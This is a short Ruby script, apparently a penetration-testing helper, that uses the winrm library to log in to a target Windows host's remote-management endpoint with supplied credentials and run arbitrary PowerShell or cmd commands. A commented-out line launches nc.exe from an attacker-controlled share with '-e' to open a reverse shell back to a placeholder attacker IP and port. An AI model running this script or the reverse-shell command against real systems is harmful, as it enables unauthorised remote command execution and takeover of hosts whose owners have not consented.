#!/usr/bin/ruby

require 'winrm'
opts = { 
  endpoint: 'http://<targetIP>:5985/wsman',
  user: '<user>',
  password: '<password>'
}
conn = WinRM::Connection.new(opts)
#conn.shell(:cmd) do |shell|
conn.shell(:powershell) do |shell|
  #output = shell.run("\\<attackerIP>\<sharename>\nc.exe <attackerIP> <port> -e <command>") do |stdout, stderr|
  output = shell.run("<powershellCommand|cmdCommand>") do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
